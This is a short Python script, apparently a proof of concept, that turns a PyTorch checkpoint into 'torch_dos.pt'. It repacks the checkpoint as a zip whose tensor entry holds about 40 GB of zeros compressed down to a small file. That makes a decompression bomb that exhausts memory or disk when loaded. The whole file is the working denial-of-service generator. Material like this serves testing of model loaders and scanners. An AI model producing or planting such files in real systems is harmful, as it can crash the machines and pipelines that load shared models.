import os
from zipfile import ZIP_DEFLATED, ZipFile

import torch

FILESIZE = 40 * 1000  # 40 Go
BUFFER = b"\0" * 1000 * 1000  # 1 Mo

filename = "torch_dos_tmp.pt"
torch.save({"weight": torch.zeros((2, 2))}, filename)


with ZipFile(filename, "r") as torch_zip:
    outfilename = "torch_dos.pt"
    with ZipFile(outfilename, "w", compression=ZIP_DEFLATED) as outzip:
        outzip.writestr("archive/data.pkl", torch_zip.open("archive/data.pkl").read())
        outzip.writestr("archive/version", torch_zip.open("archive/version").read())
        with outzip.open("archive/data/0", "w", force_zip64=True) as f:
            for i in range(FILESIZE):
                f.write(BUFFER)

os.remove(filename)
